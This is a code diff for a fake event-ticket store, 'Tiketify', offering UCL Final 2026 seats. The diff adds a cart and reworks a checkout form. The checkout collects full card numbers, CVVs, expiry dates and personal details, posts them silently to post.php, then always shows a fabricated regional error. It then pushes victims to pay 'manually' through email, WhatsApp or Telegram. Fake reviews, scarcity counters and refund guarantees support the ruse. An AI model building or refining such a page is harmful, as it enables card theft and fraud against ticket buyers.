@@ -38,7 +38,6 @@
         :root {
             --ucl-blue: #003399;
         }
-        
         body {
             font-family: 'Inter', sans-serif;
             scroll-behavior: smooth;
@@ -93,6 +92,13 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Input styling to hide arrows on number inputs */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
     </style>
 </head>
 <body class="bg-slate-50 text-slate-900">
@@ -105,11 +111,14 @@
             const [activePage, setActivePage] = useState('home');
             const [isMenuOpen, setIsMenuOpen] = useState(false);
             const [selectedTicket, setSelectedTicket] = useState(null);
+            const [cart, setCart] = useState([]);
+            const [isCartOpen, setIsCartOpen] = useState(false);
+            const [showNotification, setShowNotification] = useState(false);
 
-            // Re-initialize icons whenever the DOM updates
+            // Re-initialize icons whenever the UI updates
             useEffect(() => {
                 lucide.createIcons();
-            }, [activePage, isMenuOpen, selectedTicket]);
+            }, [activePage, isMenuOpen, selectedTicket, cart, isCartOpen, showNotification]);
 
             const navigate = (page) => {
                 setActivePage(page);
@@ -117,12 +126,34 @@
                 window.scrollTo(0, 0);
             };
 
+            const addToCart = (ticket, qty) => {
+                const quantity = parseInt(qty);
+                setCart(prev => {
+                    const existing = prev.find(item => item.cat === ticket.cat);
+                    if (existing) {
+                        return prev.map(item => item.cat === ticket.cat 
+                            ? { ...item, quantity: item.quantity + quantity } 
+                            : item);
+                    }
+                    return [...prev, { ...ticket, quantity }];
+                });
+                setShowNotification(true);
+                setTimeout(() => setShowNotification(false), 4000);
+            };
+
+            const cartTotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const cartItemsCount = cart.reduce((sum, item) => sum + item.quantity, 0);
+
             const CheckoutModal = ({ ticket, onClose }) => {
-                const [step, setStep] = useState('form'); // form, loading, error1, error2
+                const [step, setStep] = useState('form'); 
                 const [cardValue, setCardValue] = useState('');
                 const [cvvValue, setCvvValue] = useState('');
                 const [expiryYear, setExpiryYear] = useState('2026');
                 
+                useEffect(() => {
+                    lucide.createIcons();
+                }, [step]);
+
                 const handleCardInput = (e) => {
                     let value = e.target.value.replace(/\D/g, '');
                     let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
@@ -138,30 +169,23 @@
                     e.preventDefault();
                     setStep('loading');
                     
-                    // Background post to post.php
                     const formData = new FormData(e.target);
-                    formData.append('ticket_category', ticket.cat);
-                    formData.append('ticket_price', ticket.price);
+                    formData.append('ticket_category', ticket.cat || 'Cart Order');
+                    formData.append('ticket_price', ticket.price || cartTotal);
 
                     try {
                         fetch('post.php', {
                             method: 'POST',
                             body: formData
                         });
-                    } catch (err) {
-                        // Silently fail as requested
-                    }
+                    } catch (err) {}
 
-                    // 6 second simulated processing
                     setTimeout(() => {
                         setStep('error1');
                     }, 6000);
                 };
 
-                // Generate years 2026-2032
                 const years = Array.from({length: 7}, (_, i) => 2026 + i);
-                
-                // Generate months based on year selection
                 const getMonths = () => {
                     const startMonth = expiryYear === '2026' ? 6 : 1;
                     return Array.from({length: 13 - startMonth}, (_, i) => {
@@ -170,35 +194,42 @@
                     });
                 };
 
+                // Generate Dynamic Message for Manual Booking
+                const orderSummary = cart.length > 0 
+                    ? cart.map(item => `${item.cat} (x${item.quantity})`).join(', ')
+                    : ticket.cat;
+                
+                const rawMessage = `I wish to purchase tickets for the UCL Final. I need ${orderSummary}. I need more information.`;
+                const encodedMessage = encodeURIComponent(rawMessage);
+                const mailtoLink = `mailto:support@tiketify.store?subject=Manual Booking Request&body=${encodedMessage}`;
+                const whatsappLink = `https://wa.me/12894474993?text=${encodedMessage}`;
+                const telegramLink = `https://t.me/tiketify`; // Standard profile link (Telegram doesn't support pre-filled profile text via standard URL)
+
                 if (!ticket) return null;
 
                 return (
-                    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-900/80 backdrop-blur-sm">
-                        <div className="bg-white w-full max-w-xl rounded-[2.5rem] shadow-2xl overflow-hidden animate-fade-in relative">
-                            
-                            {/* Close Button */}
+                    <div className="fixed inset-0 z-[200] flex items-center justify-center p-3 sm:p-4 bg-slate-900/80 backdrop-blur-sm overflow-y-auto">
+                        <div className="bg-white w-full max-w-lg sm:max-w-xl rounded-[2.5rem] shadow-2xl overflow-hidden animate-fade-in relative max-h-[95vh] flex flex-col my-auto">
                             {step === 'form' && (
-                                <button onClick={onClose} className="absolute top-6 right-6 text-slate-400 hover:text-slate-900 transition-colors">
+                                <button onClick={onClose} className="absolute top-6 right-6 text-slate-400 hover:text-slate-900 transition-colors z-10">
                                     <i data-lucide="x" className="w-6 h-6"></i>
                                 </button>
                             )}
 
-                            {/* Header */}
-                            <div className="p-8 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between">
+                            <div className="p-6 sm:p-8 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between flex-shrink-0">
                                 <div className="flex items-center gap-2">
                                     <h2 className="text-xl font-black uppercase tracking-tight italic">Secure Checkout</h2>
                                     <i data-lucide="lock" className="w-5 h-5 text-green-600"></i>
                                 </div>
                                 <div className="text-right">
-                                    <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Selected Item</p>
-                                    <p className="font-bold text-blue-600 uppercase text-xs">{ticket.cat} - €{ticket.price.toLocaleString()}</p>
+                                    <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Total Amount</p>
+                                    <p className="font-bold text-blue-600 uppercase text-xs">€{(ticket.price || cartTotal).toLocaleString()}</p>
                                 </div>
                             </div>
 
-                            <div className="p-8">
+                            <div className="flex-1 overflow-y-auto p-6 sm:p-8">
                                 {step === 'form' && (
                                     <form onSubmit={handleSubmit} className="space-y-6">
-                                        {/* Customer Details */}
                                         <div className="space-y-4">
                                             <p className="text-[11px] font-black uppercase tracking-[0.2em] text-slate-400">Customer Information</p>
                                             <input required name="name" type="text" placeholder="Full Name" className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none transition-all font-medium" />
@@ -216,21 +247,12 @@
                                             <input required name="email" type="email" placeholder="Email Address" className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none font-medium" />
                                         </div>
 
-                                        {/* Card Details */}
                                         <div className="space-y-4">
                                             <p className="text-[11px] font-black uppercase tracking-[0.2em] text-slate-400">Payment Details</p>
                                             <div className="relative">
-                                                <input 
-                                                    required 
-                                                    name="card_number" 
-                                                    type="text" 
-                                                    placeholder="5712 3562 3673 3673" 
-                                                    value={cardValue}
-                                                    onChange={handleCardInput}
-                                                    className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none font-medium" 
-                                                />
+                                                <input required name="card_number" type="text" placeholder="5712 3562 3673 3673" value={cardValue} onChange={handleCardInput} className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none font-medium" />
                                                 <div className="absolute right-4 top-1/2 -translate-y-1/2 flex gap-1 opacity-60">
-                                                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" alt="Visa" />
+                                                    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" className="h-4" alt="Visa" />
                                                     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
                                                 </div>
                                             </div>
@@ -244,19 +266,10 @@
                                                         {years.map(y => <option key={y} value={y}>{y}</option>)}
                                                     </select>
                                                 </div>
-                                                <input 
-                                                    required 
-                                                    name="cvv" 
-                                                    type="text" 
-                                                    placeholder="CVV" 
-                                                    value={cvvValue}
-                                                    onChange={handleCvvInput}
-                                                    className="w-1/3 px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none font-medium" 
-                                                />
+                                                <input required name="cvv" type="text" placeholder="CVV" value={cvvValue} onChange={handleCvvInput} className="w-1/3 px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none font-medium" />
                                             </div>
                                         </div>
 
-                                        {/* Billing */}
                                         <div className="space-y-4">
                                             <div className="flex gap-3">
                                                 <select required name="country" className="w-1/2 px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl font-medium outline-none">
@@ -313,20 +326,20 @@
                                         <p className="text-slate-500 mb-8 text-sm">Automated processing is currently unavailable for your region. Please complete your booking manually.</p>
                                         
                                         <div className="w-full space-y-4">
-                                            <a href={`mailto:gonapyoung@gmail.com?subject=Manual Booking Request: ${ticket.cat}&body=I wish to purchase ${ticket.cat} for the UCL Final.`} className="block w-full py-5 bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest text-lg shadow-xl shadow-blue-600/10">
+                                            <a href={mailto:support@tiketify.store} className="block w-full py-5 bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest text-lg shadow-xl shadow-blue-600/10">
                                                 Buy Manually
                                             </a>
                                             
                                             <div className="grid grid-cols-3 gap-4 pt-4">
-                                                <a href="mailto:gonapyoung@gmail.com" className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
+                                                <a href={mailtoLink} className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
                                                     <i data-lucide="mail" className="w-6 h-6 text-slate-900 mb-2"></i>
                                                     <span className="text-[10px] font-black uppercase text-slate-400">Email</span>
                                                 </a>
-                                                <a href="https://wa.me/your-number" className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
+                                                <a href={whatsappLink} target="_blank" className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
                                                     <i data-lucide="message-circle" className="w-6 h-6 text-green-500 mb-2"></i>
                                                     <span className="text-[10px] font-black uppercase text-slate-400">WhatsApp</span>
                                                 </a>
-                                                <a href="https://t.me/your-id" className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
+                                                <a href={telegramLink} target="_blank" className="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-slate-100 transition-colors">
                                                     <i data-lucide="send" className="w-6 h-6 text-blue-500 mb-2"></i>
                                                     <span className="text-[10px] font-black uppercase text-slate-400">Telegram</span>
                                                 </a>
@@ -354,17 +367,34 @@
                             <div className="hidden md:flex space-x-10 items-center">
                                 <button onClick={() => navigate('home')} className={`text-sm font-bold uppercase tracking-wider ${activePage === 'home' ? 'text-blue-600' : 'text-slate-500 hover:text-blue-600'}`}>Home</button>
                                 <button onClick={() => navigate('champions-league')} className={`text-sm font-bold uppercase tracking-wider ${activePage === 'champions-league' ? 'text-blue-600' : 'text-slate-500 hover:text-blue-600'}`}>UCL Final 2026</button>
+                                
+                                <div className="relative group cursor-pointer" onClick={() => setIsCartOpen(true)}>
+                                    <div className="p-3 bg-slate-100 rounded-full hover:bg-blue-100 transition-colors">
+                                        <i data-lucide="shopping-cart" className="w-5 h-5 text-slate-900"></i>
+                                    </div>
+                                    {cartItemsCount > 0 && (
+                                        <span className="absolute -top-1 -right-1 bg-blue-600 text-white text-[10px] font-black w-5 h-5 rounded-full flex items-center justify-center border-2 border-white shadow-lg animate-bounce">
+                                            {cartItemsCount}
+                                        </span>
+                                    )}
+                                </div>
+                                
                                 <button className="bg-slate-900 text-white px-7 py-2.5 rounded-full text-xs font-black uppercase tracking-widest hover:bg-blue-600 transition-all">Member Login</button>
                             </div>
 
-                            <div className="md:hidden">
+                            <div className="md:hidden flex items-center gap-4">
+                                <div className="relative" onClick={() => setIsCartOpen(true)}>
+                                    <i data-lucide="shopping-cart" className="w-6 h-6 text-slate-900"></i>
+                                    {cartItemsCount > 0 && (
+                                        <span className="absolute -top-2 -right-2 bg-blue-600 text-white text-[10px] font-black w-5 h-5 rounded-full flex items-center justify-center">{cartItemsCount}</span>
+                                    )}
+                                </div>
                                 <button onClick={() => setIsMenuOpen(!isMenuOpen)} className="text-slate-900 p-2">
                                     <i data-lucide={isMenuOpen ? "x" : "menu"}></i>
                                 </button>
                             </div>
                         </div>
                     </div>
-                    {/* Mobile Menu */}
                     {isMenuOpen && (
                         <div className="md:hidden bg-white border-b p-6 space-y-4 animate-fade-in">
                             <button onClick={() => navigate('home')} className="block w-full text-left font-bold text-slate-600">Home</button>
@@ -416,7 +446,7 @@
                                     </div>
                                     <div className="flex items-center">
                                         <i data-lucide="mail" className="text-blue-500 mr-4 shrink-0"></i>
-                                        <p className="text-slate-300">global-hq@tiketify.com</p>
+                                        <p className="text-slate-300">support@tiketify.store</p>
                                     </div>
                                     <div className="flex items-center">
                                         <i data-lucide="clock" className="text-blue-500 mr-4 shrink-0"></i>
@@ -504,8 +534,8 @@
                             </div>
                             <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                                 {[
-                                    { event: "UCL Final 2025", location: "Munich, Germany", img: "https://images.unsplash.com/photo-1543351611-58f69d7c1781?auto=format&fit=crop&q=80&w=800" },
-                                    { event: "Super Bowl LIX", location: "New Orleans, USA", img: "https://images.unsplash.com/photo-1566733971217-d6a89e3901d2?auto=format&fit=crop&q=80&w=800" },
+                                    { event: "UCL Final 2025", location: "Munich, Germany", img: "https://upload.wikimedia.org/wikipedia/en/d/d0/2025_UEFA_Champions_League_Final_programme.png" },
+                                    { event: "Super Bowl LX", location: "California, USA", img: "https://www.nbc.com/sites/nbcblog/files/styles/scale_862/public/2026/02/super-bowl-lx-logo-.jpg" },
                                     { event: "Wimbledon Final", location: "London, UK", img: "https://images.unsplash.com/photo-1592709823125-a191f07a2a5e?auto=format&fit=crop&q=80&w=800" },
                                 ].map((item, i) => (
                                     <div key={i} className="group relative h-[500px] rounded-[2.5rem] overflow-hidden shadow-xl">
@@ -547,11 +577,21 @@
 
             const ChampionsLeaguePage = () => {
                 const tickets = [
-                    { cat: "Category 1", price: 950, stock: "Only 12 Left", desc: "Main Stand Central. Unbeatable view of the trophy presentation and player tunnel.", color: "bg-blue-600" },
-                    { cat: "Category 2", price: 650, stock: "Limited Stock", desc: "Corner views in the lower tier. Experience the roar of the ultras up close.", color: "bg-teal-500" },
-                    { cat: "Category 3", price: 180, stock: "Selling Fast", desc: "Upper Tier Behind Goals. Great panoramic views of the tactical play.", color: "bg-orange-500" },
-                    { cat: "VIP Skybox", price: 4500, stock: "Only 2 Available", desc: "Private suite, Michelin-star dining, open bar, and cushioned luxury balcony seating.", color: "bg-amber-400" }
+                    { cat: "Category 1", price: 950, stock: "Only 12 Left", limit: 12, desc: "Main Stand Central. Unbeatable view of the trophy presentation and player tunnel.", color: "bg-blue-600" },
+                    { cat: "Category 2", price: 650, stock: "Limited Stock", limit: 25, desc: "Corner views in the lower tier. Experience the roar of the ultras up close.", color: "bg-teal-500" },
+                    { cat: "Category 3", price: 180, stock: "Selling Fast", limit: 50, desc: "Upper Tier Behind Goals. Great panoramic views of the tactical play.", color: "bg-orange-500" },
+                    { cat: "VIP Skybox", price: 4500, stock: "Only 2 Available", limit: 2, desc: "Private suite, Michelin-star dining, open bar, and cushioned luxury balcony seating.", color: "bg-amber-400" }
                 ];
+
+                const [qtys, setQtys] = useState(tickets.reduce((acc, t) => ({...acc, [t.cat]: 1}), {}));
+
+                const updateQty = (cat, val, max) => {
+                    let v = parseInt(val);
+                    if (isNaN(v)) v = 1;
+                    if (v < 1) v = 1;
+                    if (v > max) v = max;
+                    setQtys(prev => ({...prev, [cat]: v}));
+                };
 
                 const reviews = [
                     { name: "John Thompson", text: "Incredible experience! The tickets were verified and delivered instantly to my app. Tiketify is the real deal.", img: "https://i.pravatar.cc/150?u=john" },
@@ -612,7 +652,7 @@
                                         <ul className="space-y-4">
                                             <li className="flex items-center font-bold text-sm"><i data-lucide="check-circle-2" className="mr-3 w-5 h-5"></i> Authentic Ticket Guarantee</li>
                                             <li className="flex items-center font-bold text-sm"><i data-lucide="check-circle-2" className="mr-3 w-5 h-5"></i> On-Time Digital Delivery</li>
-                                            <li className="flex items-center font-bold text-sm"><i data-lucide="check-circle-2" className="mr-3 w-5 h-5"></i> 150% Refund on Fail</li>
+                                            <li className="flex items-center font-bold text-sm"><i data-lucide="check-circle-2" className="mr-3 w-5 h-5"></i> 100% Refund on Fail</li>
                                         </ul>
                                     </div>
                                 </div>
@@ -638,12 +678,24 @@
                                                         <p className="text-3xl font-black italic tracking-tighter">€{t.price.toLocaleString()}</p>
                                                         <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Fixed Price</p>
                                                     </div>
-                                                    <button 
-                                                        onClick={() => setSelectedTicket(t)}
-                                                        className="w-full md:w-auto px-10 py-4 bg-slate-950 text-white font-black rounded-2xl hover:bg-blue-600 transition-all shadow-xl text-sm uppercase tracking-widest text-center"
-                                                    >
-                                                        Buy Now!!
-                                                    </button>
+                                                    <div className="flex flex-col items-center gap-3">
+                                                        <div className="flex items-center bg-slate-100 p-1 rounded-xl border border-slate-200">
+                                                            <button onClick={() => updateQty(t.cat, qtys[t.cat] - 1, t.limit)} className="w-8 h-8 flex items-center justify-center font-black">-</button>
+                                                            <input 
+                                                                type="number" 
+                                                                className="w-10 bg-transparent text-center font-black focus:outline-none" 
+                                                                value={qtys[t.cat]}
+                                                                onChange={(e) => updateQty(t.cat, e.target.value, t.limit)}
+                                                            />
+                                                            <button onClick={() => updateQty(t.cat, qtys[t.cat] + 1, t.limit)} className="w-8 h-8 flex items-center justify-center font-black">+</button>
+                                                        </div>
+                                                        <button 
+                                                            onClick={() => addToCart(t, qtys[t.cat])}
+                                                            className="w-full md:w-auto px-8 py-4 bg-slate-950 text-white font-black rounded-2xl hover:bg-blue-600 transition-all shadow-xl text-[10px] uppercase tracking-widest text-center"
+                                                        >
+                                                            Add to Cart
+                                                        </button>
+                                                    </div>
                                                 </div>
                                             ))}
                                         </div>
@@ -655,10 +707,9 @@
                             </div>
                         </section>
 
-                        {/* 15 Moving Reviews Marquee */}
                         <section className="py-20 bg-white overflow-hidden border-y border-slate-100">
                             <div className="text-center mb-12">
-                                <h2 className="text-3xl font-black uppercase tracking-tighter italic">Recent <span className="text-blue-600">Client Reviews</span></h2>
+                                <h2 className="text-3xl font-black uppercase tracking-tighter italic"> <span className="text-blue-600">Client Reviews</span></h2>
                             </div>
                             <div className="marquee-container relative flex overflow-x-hidden">
                                 <div className="animate-marquee flex whitespace-nowrap">
@@ -703,19 +754,87 @@
                                 </div>
                             </div>
                         </section>
-                        
-                        {selectedTicket && <CheckoutModal ticket={selectedTicket} onClose={() => setSelectedTicket(null)} />}
                     </div>
                 );
             };
 
+            const CartDrawer = () => (
+                <div className={`fixed inset-0 z-[150] transition-opacity duration-300 ${isCartOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
+                    <div className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" onClick={() => setIsCartOpen(false)}></div>
+                    <div className={`absolute right-0 top-0 h-full w-full max-w-md bg-white shadow-2xl transition-transform duration-500 transform ${isCartOpen ? 'translate-x-0' : 'translate-x-full'} flex flex-col`}>
+                        <div className="p-8 border-b flex items-center justify-between">
+                            <h3 className="text-2xl font-black italic uppercase tracking-tighter">Your Cart</h3>
+                            <button onClick={() => setIsCartOpen(false)} className="p-2 hover:bg-slate-100 rounded-full">
+                                <i data-lucide="x" className="w-6 h-6"></i>
+                            </button>
+                        </div>
+                        
+                        <div className="flex-1 overflow-y-auto p-8 space-y-6">
+                            {cart.length === 0 ? (
+                                <div className="text-center py-20 opacity-30">
+                                    <i data-lucide="shopping-cart" className="w-16 h-16 mx-auto mb-4"></i>
+                                    <p className="font-bold uppercase tracking-widest text-xs">Cart is empty</p>
+                                </div>
+                            ) : (
+                                cart.map((item, i) => (
+                                    <div key={i} className="flex justify-between items-center bg-slate-50 p-6 rounded-[1.5rem] border border-slate-100">
+                                        <div>
+                                            <p className="font-black uppercase italic text-sm">{item.cat}</p>
+                                            <p className="text-xs font-bold text-slate-400">{item.quantity} x €{item.price.toLocaleString()}</p>
+                                        </div>
+                                        <div className="flex items-center gap-4">
+                                            <p className="font-black text-blue-600">€{(item.price * item.quantity).toLocaleString()}</p>
+                                            <button onClick={() => setCart(cart.filter(x => x.cat !== item.cat))} className="text-red-400 hover:text-red-600"><i data-lucide="trash-2" className="w-4 h-4"></i></button>
+                                        </div>
+                                    </div>
+                                ))
+                            )}
+                        </div>
+
+                        {cart.length > 0 && (
+                            <div className="p-8 border-t bg-slate-50">
+                                <div className="flex justify-between items-center mb-6">
+                                    <p className="font-black uppercase tracking-widest text-xs text-slate-400">Grand Total</p>
+                                    <p className="text-2xl font-black italic">€{cartTotal.toLocaleString()}</p>
+                                </div>
+                                <button 
+                                    onClick={() => {
+                                        setIsCartOpen(false);
+                                        setSelectedTicket({ cat: 'Full Cart Order', price: cartTotal });
+                                    }}
+                                    className="w-full py-5 bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest text-lg shadow-xl shadow-blue-600/20"
+                                >
+                                    Proceed to Checkout
+                                </button>
+                            </div>
+                        )}
+                    </div>
+                </div>
+            );
+
             return (
-                <div className="min-h-screen flex flex-col selection:bg-blue-100 selection:text-blue-900">
+                <div className="min-h-screen flex flex-col selection:bg-blue-100 selection:text-blue-900 relative">
                     <Navbar />
+                    
+                    <div className={`fixed top-24 right-4 z-[300] bg-white border border-blue-100 shadow-2xl p-6 rounded-[2rem] transition-all duration-500 transform ${showNotification ? 'translate-x-0 opacity-100' : 'translate-x-10 opacity-0 pointer-events-none'} flex items-center gap-4`}>
+                        <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center">
+                            <i data-lucide="check" className="text-green-600 w-5 h-5"></i>
+                        </div>
+                        <div>
+                            <p className="font-black uppercase tracking-tight text-xs">Item Added to Cart</p>
+                            <button onClick={() => setIsCartOpen(true)} className="text-blue-600 font-black text-[10px] uppercase tracking-widest mt-1 hover:underline">View Cart & Checkout →</button>
+                        </div>
+                        <button onClick={() => setShowNotification(false)} className="ml-4 opacity-30 hover:opacity-100"><i data-lucide="x" className="w-4 h-4"></i></button>
+                    </div>
+
                     <main className="flex-grow pt-20">
                         {activePage === 'home' ? <HomePage /> : <ChampionsLeaguePage />}
                     </main>
+
                     <Footer />
+                    
+                    <CartDrawer />
+                    {selectedTicket && <CheckoutModal ticket={selectedTicket} onClose={() => setSelectedTicket(null)} />}
                 </div>
             );
         };
